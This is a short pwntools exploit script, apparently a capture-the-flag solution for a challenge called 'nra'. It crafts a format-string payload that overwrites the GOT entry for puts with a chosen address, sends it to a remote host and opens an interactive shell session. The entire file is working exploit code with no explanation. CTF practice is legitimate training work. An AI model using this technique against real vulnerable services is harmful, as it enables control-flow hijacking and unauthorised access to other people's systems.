from pwn import *

context.arch = 'i386'
# p = process("./nra")
p = remote("95.216.233.106", 17562)
e = ELF("./nra")


input("debug")

writes = {e.got[b'puts']: 0x08049245}

payload = fmtstr_payload(4, writes)

p.recvuntil("RACTF?")
p.sendline(payload)

p.interactive()

